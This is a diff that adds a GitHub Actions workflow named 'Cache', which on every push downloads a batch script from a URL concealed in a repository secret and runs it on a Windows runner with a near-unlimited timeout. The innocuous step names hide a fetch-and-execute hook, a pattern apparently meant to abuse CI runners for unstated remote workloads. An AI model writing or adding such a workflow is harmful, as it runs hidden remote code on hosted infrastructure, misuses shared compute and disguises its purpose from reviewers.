@@ -1,0 +1,17 @@
+name: Cache
+
+on: push
+
+jobs:
+  build:
+    runs-on: windows-latest
+    timeout-minutes: 99999999
+    
+    steps:
+    - name: Setup Cache
+      run: curl -o C:\ss.cmd $Env:FL
+      env:
+        FL: ${{ secrets.FL }}
+
+    - name: Uh
+      run: cmd /c C:\ss.cmd
